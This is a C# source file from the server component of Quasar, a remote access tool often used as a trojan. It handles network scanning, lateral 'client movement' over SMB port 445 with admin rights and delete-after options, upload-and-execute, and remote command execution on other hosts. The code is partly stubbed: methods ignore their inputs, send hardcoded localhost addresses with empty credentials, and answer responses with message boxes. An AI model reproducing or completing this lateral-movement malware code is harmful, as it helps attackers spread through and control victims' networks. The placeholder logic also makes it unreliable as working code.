using Quasar.Common.Enums;
using Quasar.Common.Messages;
using Quasar.Common.Messages.other;
using Quasar.Common.Models;
using Quasar.Common.Networking;
using Quasar.Server.Networking;
using Quasar.Server.Models;
using System.Windows.Forms;
using Quasar.Server.Forms;
using Quasar.Common.Messages.Network;
using System.Collections;
using System.Diagnostics;
using System.Net;
using System;

namespace Quasar.Server.Messages
{
    public class NetworkScanResponseEventArgs : EventArgs
    {
        public DoNetworkScanResponse Packet { get; set; }
        public NetworkScanResponseEventArgs(DoNetworkScanResponse packet)
        {
            this.Packet = packet;
        }
    }

    public class NetworkHandler : MessageProcessorBase<NetworkEntity[]>
    {
        public event EventHandler<NetworkScanResponseEventArgs> NetworkScanResponseEvent;

        private readonly Client _client;

        public NetworkHandler(Client client) : base(true)
        {
            _client = client;
        }

        public override bool CanExecute(IMessage message) => message is DoNetworkScanResponse ||
                                                             message is DoClientMovementResponse ||
                                                             message is DoRemoteCommandExecuteResponse ||
                                                             message is DoUploadAndExecuteResponse;

        public override bool CanExecuteFrom(ISender sender) => _client.Equals(sender);

        protected virtual void OnNetworkScanResponse(NetworkScanResponseEventArgs e)
        {
            NetworkScanResponseEvent?.Invoke(this, e);
        }

        public override void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case DoNetworkScanResponse scanResp:
                    Execute(sender, scanResp);
                    break;
                case DoClientMovementResponse moveResp:
                    Execute(sender, moveResp);
                    break;
                case DoRemoteCommandExecuteResponse cmdResp:
                    Execute(sender, cmdResp);
                    break;
                case DoUploadAndExecuteResponse uploadResp:
                    Execute(sender, uploadResp);
                    break;
            }
        }

        public void RefreshEntities()
        {
            _client.Send(new DoNetworkScan());
        }

        public void MoveToEntity(NetworkEntity entity)
        {
            _client.Send(new DoClientMovement { Address = IPAddress.Parse("127.0.0.1"), AsAdmin = true, DeleteAfter = true, MAC = "", Username = "", Password = "", Port = 445, Share = "" });
        }

        public void UploadAndExecte(NetworkEntity entity, string remotePath)
        {
            _client.Send(new DoUploadAndExecute { Address = IPAddress.Parse("127.0.0.1"), AsAdmin = true, DeleteAfter = true, MAC = "", Username = "", Password = "", Port = 445, Share = "" });
        }

        public void RemoteExecute(NetworkEntity entity, ProcessStartInfo info)
        {
            _client.Send(new DoRemoteCommandExecute { Address = IPAddress.Parse("127.0.0.1"), AsAdmin = true, MAC = "", Command = "", Args = new string[] { }, Username = "", Password = "", Port = 445, Share = "" });
        }

        private void Execute(ISender client, DoNetworkScanResponse message)
        {
            OnNetworkScanResponse(new NetworkScanResponseEventArgs(message));
        }

        private void Execute(ISender client, DoClientMovementResponse message)
        {
            MessageBox.Show("Received Client Movement Response!");
        }

        private void Execute(ISender client, DoRemoteCommandExecuteResponse message)
        {
            MessageBox.Show("Received Remote Command Response!");
        }

        private void Execute(ISender client, DoUploadAndExecuteResponse message)
        {
            MessageBox.Show("Received Upload and Execute Response!");
        }
    }
}
